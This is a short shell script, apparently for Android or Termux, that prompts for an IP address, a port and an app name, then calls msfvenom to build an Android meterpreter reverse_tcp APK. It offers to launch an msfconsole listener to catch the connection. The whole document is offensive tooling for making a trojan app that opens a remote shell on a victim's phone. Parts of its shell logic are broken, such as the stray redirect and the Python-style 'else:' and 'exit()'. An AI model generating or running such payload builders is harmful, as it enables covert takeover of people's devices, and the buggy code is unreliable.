#!/system/bin/sh
clear
echo "################№#################"
echo "#  SCRIPT FOR LAUNCHUNG MSFVENOM #"
echo "#    auto create payload         #"
echo -e "#\e[1;31m @autor [*] 艾 Star Ford 艾\e[0m   #"
echo "# github = github.com/Star-Ford   #"
echo "#########################№#№##№##№"
echo ""
echo -e "\e[1;31m LaUnchInG msfvenom.............\e[0m"
echo ""
echo -e "\e[1;33m ENTER YOUR IP ADDRESS $:\e[0m"
read IP

     echo -e "\e[1;33m ENTER YOUR PORT NUMBER E.G (80)$:\e[0m"
read PORT

     echo -e "\e[1;33m what name do you want for the payload app ?$:\e[0m"
read pay
echo ""
  echo -e "\e[1;34m pls wait while the script  creates  a payload \e[0m"
    echo ""
msfvenom -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT >R -o /root/$pay.apk
  echo ""
echo "Payload succesfully created [ located at system home directory"
     echo "========================================================="
echo ""
echo " payload saved as $pay.apk"
echo ""
echo -e " \e[1;33mDo you want to start MSFCONSOLE listener ?? :\e[0m"
echo " launching Listeners ....."
echo "       yes or no ?   "

yes=$(msfconsole)
read $yes
if [[ $yes == msfconsole ]]; then
    echo "lets run listeners"
    echo msfconsole
else:
   exit()
fi

#my git ripo https://github.com/Z3r0-404
#facebook    Abbah Isah
#insagram    Abba_0x2
#thanks to ALLAH SWA
